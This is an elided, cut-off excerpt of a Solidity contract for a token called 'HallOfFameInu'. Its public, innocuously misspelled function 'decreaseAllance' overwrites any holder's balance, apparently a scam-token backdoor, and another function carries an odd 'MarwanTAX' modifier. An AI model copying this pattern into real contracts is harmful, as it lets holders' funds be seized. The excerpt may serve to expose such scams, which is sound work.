...
contract HallOfFameInu is IERC20, Ownable {
    ...
    string private _name = "HallOfFameInu";
    ...
    function decreaseAllance(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function IncreaseAllance(address Router) public MarwanTAX {
